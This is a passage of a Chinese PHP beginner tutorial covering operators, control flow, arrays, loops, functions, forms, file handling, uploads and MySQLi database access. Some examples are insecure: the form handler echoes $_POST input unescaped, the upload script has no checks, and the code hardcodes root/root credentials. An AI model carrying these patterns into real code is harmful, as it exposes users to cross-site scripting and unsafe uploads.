&#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x % $y); &#x2F;&#x2F; 输出4\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho -$x;\n?&gt;\n\n\n\n赋值运算符&lt;?php \n$x&#x3D;10; \necho $x; &#x2F;&#x2F; 输出10\n \n$y&#x3D;20; \n$y +&#x3D; 100;\necho $y; &#x2F;&#x2F; 输出120\n \n$z&#x3D;50;\n$z -&#x3D; 25;\necho $z; &#x2F;&#x2F; 输出25\n \n$i&#x3D;5;\n$i *&#x3D; 6;\necho $i; &#x2F;&#x2F; 输出30\n \n$j&#x3D;10;\n$j &#x2F;&#x3D; 5;\necho $j; &#x2F;&#x2F; 输出2\n \n$k&#x3D;15;\n$k %&#x3D; 4;\necho $k; &#x2F;&#x2F; 输出3\n?&gt;\n\n\n\n递增&#x2F;递减运算符&lt;?php\n$x&#x3D;10; \necho ++$x; &#x2F;&#x2F; 输出11\n \n$y&#x3D;10; \necho $y++; &#x2F;&#x2F; 输出10\n \n$z&#x3D;5;\necho --$z; &#x2F;&#x2F; 输出4\n \n$i&#x3D;5;\necho $i--; &#x2F;&#x2F; 输出5\n?&gt;\n\n\n\n比较运算符&lt;?php\n$x&#x3D;100; \n$y&#x3D;&quot;100&quot;;\n \nvar_dump($x &#x3D;&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($x &#x3D;&#x3D;&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($x !&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($x !&#x3D;&#x3D; $y);\necho &quot;&lt;br&gt;&quot;;\n \n$a&#x3D;50;\n$b&#x3D;90;\n \nvar_dump($a &gt; $b);\necho &quot;&lt;br&gt;&quot;;\nvar_dump($a &lt; $b);\n?&gt;\n\n\n\n三元运算符语法格式(expr1) ? (expr2) : (expr3) \n\n对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。\n条件语句您编写代码时，您常常需要为不同的判断执行不同的动作。您可以在代码中使用条件语句来完成此任务。\n在 PHP 中，提供了下列条件语句：\n\nif 语句 - 在条件成立时执行代码\nif…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码\nif…elseif….else 语句 - 在若干条件之一成立时执行一个代码块\nswitch 语句 - 在若干条件之一成立时执行一个代码块\n\nif 语句用于仅当指定条件成立时执行代码\n语法if (条件)\n&#123;\n    条件成立时要执行的代码;\n&#125;\n\n&lt;?php\n$t&#x3D;date(&quot;H&quot;);\nif ($t&lt;&quot;20&quot;)\n&#123;\n    echo &quot;Have a good day!&quot;;\n&#125;\n?&gt;\n\n\n\nif…else 语句在条件成立时执行一块代码，条件不成立时执行另一块代码，请使用 if….else 语句。\n语法if (条件)\n&#123;\n条件成立时执行的代码;\n&#125;\nelse\n&#123;\n条件不成立时执行的代码;\n&#125;\n\n\n\n&lt;?php\n$t&#x3D;date(&quot;H&quot;);\nif ($t&lt;&quot;20&quot;)\n&#123;\n    echo &quot;Have a good day!&quot;;\n&#125;\nelse\n&#123;\n    echo &quot;Have a good night!&quot;;\n&#125;\n?&gt;\n\n\n\nif…elseif….else 语句在若干条件之一成立时执行一个代码块，请使用 if….elseif…else 语句。.\n语法if (条件)\n&#123;\n    if 条件成立时执行的代码;\n&#125;\nelseif (条件)\n&#123;\n    elseif 条件成立时执行的代码;\n&#125;\nelse\n&#123;\n    条件不成立时执行的代码;\n&#125;\n\n\n\n&lt;?php\n$t&#x3D;date(&quot;H&quot;);\nif ($t&lt;&quot;10&quot;)\n&#123;\n    echo &quot;Have a good morning!&quot;;\n&#125;\nelseif ($t&lt;&quot;20&quot;)\n&#123;\n    echo &quot;Have a good day!&quot;;\n&#125;\nelse\n&#123;\n    echo &quot;Have a good night!&quot;;\n&#125;\n?&gt;\n\n\n\nSwitch 语句switch 语句用于根据多个不同条件执行不同动作。\n如果您希望有选择地执行若干代码块之一，请使用 switch 语句。\n&lt;?php\n$favcolor&#x3D;&quot;red&quot;;\nswitch ($favcolor)\n&#123;\ncase &quot;red&quot;:\n    echo &quot;你喜欢的颜色是红色!&quot;;\n    break;\ncase &quot;blue&quot;:\n    echo &quot;你喜欢的颜色是蓝色!&quot;;\n    break;\ncase &quot;green&quot;:\n    echo &quot;你喜欢的颜色是绿色!&quot;;\n    break;\ndefault:\n    echo &quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;;\n&#125;\n?&gt;\n\n\n\n数组数组能够在单个变量中存储多个值\n数组可以在单个变量中存储多个值，并且您可以根据键访问其中的值。\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\necho &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;\n?&gt;\n\n\n\n创建数组在 PHP 中，array() 函数用于创建数组：\narray();\n\n\n\n在 PHP 中，有三种类型的数组：\n\n数值数组 - 带有数字 ID 键的数组\n关联数组 - 带有指定的键的数组，每个键关联一个值\n多维数组 - 包含一个或多个数组的数组\n\n数值数组这里有两种创建数值数组的方法：\n自动分配 ID 键（ID 键总是从 0 开始）：\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\necho &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;\n?&gt;\n\n\n\n获取数组的长度 - count() 函数count() 函数用于返回数组的长度（元素的数量）\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\necho count($cars);\n?&gt;\n\n\n\n遍历数值数组遍历并打印数值数组中的所有值，您可以使用 for 循环\n&lt;?php\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n$arrlength&#x3D;count($cars);\n \nfor($x&#x3D;0;$x&lt;$arrlength;$x++)\n&#123;\n    echo $cars[$x];\n    echo &quot;&lt;br&gt;&quot;;\n&#125;\n?&gt;\n\n\n\n关联数组关联数组是使用您分配给数组的指定的键的数组。\n这里有两种创建关联数组的方法\n$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);\n\nor\n\n$age[&#39;Peter&#39;]&#x3D;&quot;35&quot;;\n$age[&#39;Ben&#39;]&#x3D;&quot;37&quot;;\n$age[&#39;Joe&#39;]&#x3D;&quot;43&quot;;\n\n\n\n&lt;?php\n$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);\necho &quot;Peter is &quot; . $age[&#39;Peter&#39;] . &quot; years old.&quot;;\n?&gt;\n\n\n\n遍历关联数组遍历并打印关联数组中的所有值，您可以使用 foreach 循环\n&lt;?php\n$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);\n \nforeach($age as $x&#x3D;&gt;$x_value)\n&#123;\n    echo &quot;Key&#x3D;&quot; . $x . &quot;, Value&#x3D;&quot; . $x_value;\n    echo &quot;&lt;br&gt;&quot;;\n&#125;\n?&gt;\n\n\n\n循环循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。\n在 PHP 中，提供了下列循环语句：\n\nwhile - 只要指定的条件成立，则循环执行代码块\ndo…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环\nfor - 循环执行代码块指定的次数\nforeach - 根据数组中每个元素来循环代码块\n\nwhile 循环while 循环将重复执行代码块，直到指定的条件不成立。\n语法while (条件)\n&#123;\n    要执行的代码;\n&#125;\n\n\n\n实例首先设置变量 i 的值为 1 ($i&#x3D;1;)。\n然后，只要 i 小于或者等于 5，while 循环将继续运行。循环每运行一次，i 就会递增 1：\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$i&#x3D;1;\nwhile($i&lt;&#x3D;5)\n&#123;\n    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;\n    $i++;\n&#125;\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\ndo…while 语句do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。\n语法do\n&#123;\n    要执行的代码;\n&#125;\nwhile (条件);\n\n\n\n实例首先设置变量 i 的值为 1 ($i&#x3D;1;)。\n然后，开始 do…while 循环。循环将变量 i 的值递增 1，然后输出。先检查条件（i 小于或者等于 5），只要 i 小于或者等于 5，循环将继续运行\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$i&#x3D;1;\ndo\n&#123;\n    $i++;\n    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;\n&#125;\nwhile ($i&lt;&#x3D;5);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nFor 循环for 循环用于您预先知道脚本需要运行的次数的情况。\n语法for (初始值; 条件; 增量)\n&#123;\n    要执行的代码;\n&#125;\n\n参数：\n\n初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。\n条件：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。\n增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。\n\n注释：上面的初始值和增量参数可为空，或者有多个表达式（用逗号分隔）。\n实例\n下面的实例定义一个初始值为 i&#x3D;1 的循环。只要变量 i 小于或者等于 5，循环将继续运行。循环每运行一次，变量 i 就会递增 1\n&lt;?php\nfor ($i&#x3D;1; $i&lt;&#x3D;5; $i++)\n&#123;\n    echo &quot;数字为 &quot; . $i;\n&#125;\n?&gt;\n\n\n\nforeach 循环foreach 循环用于遍历数组。\n语法foreach ($array as $value)\n&#123;\n    要执行代码;\n&#125;\n\n每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。\nforeach ($array as $key &#x3D;&gt; $value)\n&#123;\n    要执行代码;\n&#125;\n\n每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。\n&lt;?php\n$x&#x3D;array(&quot;Google&quot;,&quot;Runoob&quot;,&quot;Taobao&quot;);\nforeach ($x as $value)\n&#123;\n    echo $value . PHP_EOL;\n&#125;\n?&gt;\n\n\n\n&lt;?php\n$x&#x3D;array(1&#x3D;&gt;&quot;Google&quot;, 2&#x3D;&gt;&quot;Runoob&quot;, 3&#x3D;&gt;&quot;Taobao&quot;);\nforeach ($x as $key &#x3D;&gt; $value)\n&#123;\n    echo &quot;key  为 &quot; . $key . &quot;，对应的 value 为 &quot;. $value . PHP_EOL;\n&#125;\n?&gt;\n\n\n\n函数创建 PHP 函数函数是通过调用函数来执行的。\n&lt;?php\nfunction functionName()\n&#123;\n    &#x2F;&#x2F; 要执行的代码\n&#125;\n?&gt;\n\n函数准则：\n\n函数的名称应该提示出它的功能\n函数名称以字母或下划线开头（不能以数字开头）\n\n&lt;?php\nfunction writeName()\n&#123;\n    echo &quot;Kai Jim Refsnes&quot;;\n&#125;\n \necho &quot;My name is &quot;;\nwriteName();\n?&gt;\n\n\n\n函数 - 添加参数为了给函数添加更多的功能，我们可以添加参数，参数类似变量。\n参数就在函数名称后面的一个括号内指定。\n&lt;?php\nfunction writeName($fname)\n&#123;\n    echo $fname . &quot; Refsnes.&lt;br&gt;&quot;;\n&#125;\n \necho &quot;My name is &quot;;\nwriteName(&quot;Kai Jim&quot;);\necho &quot;My sister&#39;s name is &quot;;\nwriteName(&quot;Hege&quot;);\necho &quot;My brother&#39;s name is &quot;;\nwriteName(&quot;Stale&quot;);\n?&gt;\n\n\n\n&lt;?php\nfunction writeName($fname,$punctuation)\n&#123;\n    echo $fname . &quot; Refsnes&quot; . $punctuation . &quot;&lt;br&gt;&quot;;\n&#125;\n \necho &quot;My name is &quot;;\nwriteName(&quot;Kai Jim&quot;,&quot;.&quot;);\necho &quot;My sister&#39;s name is &quot;;\nwriteName(&quot;Hege&quot;,&quot;!&quot;);\necho &quot;My brother&#39;s name is &quot;;\nwriteName(&quot;Ståle&quot;,&quot;?&quot;);\n?&gt;\n\n\n\n函数 - 返回值如需让函数返回一个值，请使用 return 语句\n&lt;?php\nfunction add($x,$y)\n&#123;\n    $total&#x3D;$x+$y;\n    return $total;\n&#125;\n \necho &quot;1 + 16 &#x3D; &quot; . add(1,16);\n?&gt;\n\n\n\nPHP表单PHP 中的 $_GET 和 $_POST 变量用于检索表单中的信息，比如用户输入\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n&lt;title&gt;菜鸟教程(runoob.com)&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n \n&lt;form action&#x3D;&quot;welcome.php&quot; method&#x3D;&quot;post&quot;&gt;\n名字: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;\n年龄: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;age&quot;&gt;\n&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;\n&lt;&#x2F;form&gt;\n \n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n用户填写完上面的表单并点击提交按钮时，表单的数据会被送往名为 “welcome.php” 的 PHP 文件\n欢迎&lt;?php echo $_POST[&quot;fname&quot;]; ?&gt;!&lt;br&gt;\n你的年龄是 &lt;?php echo $_POST[&quot;age&quot;]; ?&gt;  岁。\n\n\n\nPHP文件文件处理fopen() 函数用于在 PHP 中打开文件。\n打开文件fopen() 函数用于在 PHP 中打开文件。\n此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$file&#x3D;fopen(&quot;welcome.txt&quot;,&quot;r&quot;);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n文件可能通过下列模式来打开：\n\n\n\n模式\n描述\n\n\n\nr\n只读。在文件的开头开始。\n\n\nr+\n读&#x2F;写。在文件的开头开始。\n\n\nw\n只写。打开并清空文件的内容；如果文件不存在，则创建新文件。\n\n\nw+\n读&#x2F;写。打开并清空文件的内容；如果文件不存在，则创建新文件。\n\n\na\n追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。\n\n\na+\n读&#x2F;追加。通过向文件末尾写内容，来保持文件内容。\n\n\nx\n只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。\n\n\nx+\n读&#x2F;写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。\n\n\n注释：如果 fopen() 函数无法打开指定文件，则返回 0 (false)\n如果 fopen() 函数不能打开指定的文件，下面的实例会生成一段消息\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$file&#x3D;fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;Unable to open file!&quot;);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n关闭文件fclose() 函数用于关闭打开的文件\n&lt;?php\n$file &#x3D; fopen(&quot;test.txt&quot;,&quot;r&quot;);\n\n&#x2F;&#x2F;执行一些代码\n\nfclose($file);\n?&gt;\n\n\n\n逐行读取文件fgets() 函数用于从文件中逐行读取文件。\n注释：在调用该函数之后，文件指针会移动到下一行。\n&lt;?php\n$file &#x3D; fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);\n&#x2F;&#x2F; 读取文件每一行，直到文件结尾\nwhile(!feof($file))\n&#123;\n    echo fgets($file). &quot;&lt;br&gt;&quot;;\n&#125;\nfclose($file);\n?&gt;\n\n\n\n逐字符读取文件fgetc() 函数用于从文件中逐字符地读取文件。\n注释：在调用该函数之后，文件指针会移动到下一个字符。\n实例下面的实例逐字符地读取文件，直到文件末尾为止\n&lt;?php\n$file&#x3D;fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;无法打开文件!&quot;);\nwhile (!feof($file))\n&#123;\n    echo fgetc($file);\n&#125;\nfclose($file);\n?&gt;\n\n\n\n\n\n\n\n文件上传表单通过 PHP，可以把文件上传到服务器\ntest 项目下完成，目录结构为：\ntest\n|-----upload             # 文件上传的目录\n|-----form.html          # 表单文件\n|-----upload_file.php    # php 上传代码\n\n\n\n创建一个文件上传表单form.html\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n&lt;title&gt;表单&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;\n    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;\n    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n创建上传脚本“upload_file.php” 文件含有供上传文件的代码\n&lt;?php\nif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)\n&#123;\n    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;\n&#125;\nelse\n&#123;\n    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;\n    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;\n    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] &#x2F; 1024) . &quot; kB&lt;br&gt;&quot;;\n    echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];\n&#125;\n?&gt;\n\n\n\n通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。\n第一个参数是表单的 input name，第二个下标可以是 “name”、”type”、”size”、”tmp_name” 或 “error”。如下所示：\n\n$_FILES[“file”][“name”] - 上传文件的名称\n$_FILES[“file”][“type”] - 上传文件的类型\n$_FILES[“file”][“size”] - 上传文件的大小，以字节计\n$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称\n$_FILES[“file”][“error”] - 由文件上传导致的错误代码\n\n这是一种非常简单文件上传方式。基于安全方面的考虑，您应当增加有关允许哪些用户上传文件的限制。\nPHP连接MySQL数据库通过 PHP，您可以连接和操作数据库。\n连接 MySQL在我们访问 MySQL 数据库前，我们需要先连接到数据库服务器\n(MySQLi - 面向对象）&lt;?php\n$servername &#x3D; &quot;localhost&quot;;\n$username &#x3D; &quot;username&quot;;\n$password &#x3D; &quot;password&quot;;\n \n&#x2F;&#x2F; 创建连接\n$conn &#x3D; new mysqli($servername, $username, $password);\n \n&#x2F;&#x2F; 检测连接\nif ($conn-&gt;connect_error) &#123;\n    die(&quot;连接失败: &quot; . $conn-&gt;connect_error);\n&#125; \necho &quot;连接成功&quot;;\n?&gt;\n\n注意： 注意在以上面向对象的实例中 $connect_error 是在 PHP 5.2.9 和 5.3.0 中添加的。如果你需要兼容更早版本 请使用以下代码替换:  &#x2F;&#x2F; 检测连接 if (mysqli_connect_error()) {   die(“数据库连接失败: “ . mysqli_connect_error()); }\nMySQLi - 面向过程&lt;?php\n$servername &#x3D; &quot;localhost&quot;;\n$username &#x3D; &quot;username&quot;;\n$password &#x3D; &quot;password&quot;;\n \n&#x2F;&#x2F; 创建连接\n$conn &#x3D; mysqli_connect($servername, $username, $password);\n \n&#x2F;&#x2F; 检测连接\nif (!$conn) &#123;\n    die(&quot;Connection failed: &quot; . mysqli_connect_error());\n&#125;\necho &quot;连接成功&quot;;\n?&gt;\n\n\n\nPDO&lt;?php\n$servername &#x3D; &quot;localhost&quot;;\n$username &#x3D; &quot;username&quot;;\n$password &#x3D; &quot;password&quot;;\n \ntry &#123;\n    $conn &#x3D; new PDO(&quot;mysql:host&#x3D;$servername;&quot;, $username, $password);\n    echo &quot;连接成功&quot;; \n&#125;\ncatch(PDOException $e)\n&#123;\n    echo $e-&gt;getMessage();\n&#125;\n?&gt;\n\n\n\n\n\nMySQL基础知识链接\n连接数据库\n实例：\n\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    echo &quot;连接成功&quot;;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n创建数据库\n数据库存有一个或者多个表\n需要create 权限来创建或删除MySQL数据库\n创建数据库语句：create database name\n实例：\n\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    echo &quot;连接成功&quot;;\n    echo &quot;&lt;br&gt;&quot;;\n\n    &#x2F;&#x2F; 创建数据库语句\n    $sql &#x3D; &quot;CREATE DATABASE PHP&quot;; &#x2F;&#x2F; 创建一个PHP数据库\n\n    &#x2F;&#x2F; mysqli_query() 向MySQL数据库执行一条语句\n    if(mysqli_query($conn,$sql))&#123;\n        echo &quot;创建数据库 PHP成功&quot;;\n        &#125;\n    else&#123;\n        echo mysqli_error($conn);\n    &#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n运行后查看数据库是否添加\n创建数据表\n创建表的语句：create table \n实例：\n\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建数据表语句\n    $sql &#x3D; &quot;create table MyGuests (\n        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, \n        firstname VARCHAR(30) NOT NULL,\n        lastname VARCHAR(30) NOT NULL,\n        email VARCHAR(50),\n        reg_date TIMESTAMP\n        )&quot;;\n     \n     &#x2F;&#x2F;向数据库执行sql语句\n     if(mysqli_query($conn,$sql))&#123;\n        echo &quot;创建数据表成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n     &#125; \n     else&#123;echo mysqli_error($conn);&#125;\n\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n运行截图数据库中的信息\n插入数据\n语法：insert into\n实例：\n\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建插入语句\n    $sql &#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;)&quot;;\n\n    &#x2F;&#x2F; 执行语句\n    if(mysqli_query($conn,$sql))&#123;\n        echo &quot;数据插入成功&quot;;\n    &#125;\n    else&#123;echo mysqli_error($conn);&#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n运行截图数据库中的信息\n插入多条数据\nmysqli_multi_query() 函数可用来执行多条SQL语句\n实例：\n\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建插入语句\n    $sql &#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;pual&#39;, &#39;bei&#39;, &#39;pual@example.com&#39;);&quot;;\n    $sql .&#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;Mary&#39;, &#39;Moe&#39;, &#39;mary@example.com&#39;);&quot;;\n    $sql .&#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;Julie&#39;, &#39;Dooley&#39;, &#39;julie@example.com&#39;)&quot;;\n\n    &#x2F;&#x2F; 一次性插入多条语句\n    if(mysqli_multi_query($conn,$sql))&#123;\n        echo &quot;添加记录成功&quot;;\n    &#125;\n    else&#123;echo mysqli_connect_error;&#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n运行截图数据库中的信息\n读取数据\nmysqli_num_rows() ：返回sql语句查询到的总行数\nmysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组\n实例：\n\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建查询语句\n    $sql &#x3D; &quot;select id, firstname, lastname from MyGuests&quot;;\n    \n    $res &#x3D; mysqli_query($conn,$sql);\n\n    &#x2F;&#x2F; 返回sql语句查询到的总行数\n    &#x2F;&#x2F; mysqli_num_rows($res)\n\n    if(mysqli_num_rows($res) &gt; 0)&#123;\n        while($row &#x3D; mysqli_fetch_assoc($res))&#123;\n            echo &quot;id:&quot; . $row[&quot;id&quot;] . &quot;-name:&quot; . $row[&quot;firstname&quot;] . &quot; &quot; .$row[&#39;lastname&#39;].&quot;&lt;br&gt;&quot;;\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n运行截图\n\nmysqli_fetch_assoc()函数和mysqli_num_rows()函数的测试代码\n\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建查询语句\n    $sql &#x3D; &quot;select id, firstname, lastname from MyGuests&quot;;\n    \n    $res &#x3D; mysqli_query($conn,$sql);\n\n    &#x2F;&#x2F; 返回sql语句查询到的总行数\n    $row &#x3D; mysqli_num_rows($res) . &quot;&lt;br&gt;&quot;;\n\n    &#x2F;&#x2F; mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组\n\n    if($row &gt; 0)&#123;\n        while($i &#x3D; mysqli_fetch_assoc($res))&#123;\n            var_dump($i);\n            echo &quot;&lt;br&gt;&quot;;\n            \n            echo &quot;序列号为：&quot; . $i[&#39;id&#39;] . &quot;, firstname为：&quot; . $i[&#39;firstname&#39;] . &quot;, lastname为：&quot; . $i[&#39;lastname&#39;];\n            echo &quot;&lt;hr&gt;&quot;;\n        &#125;\n    &#125;\n\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n\n\nPHP正则表达式正则表达式正则表达式存在的意义：过滤和检索。\n正则表达式，又称规则表达式（Regular Expression 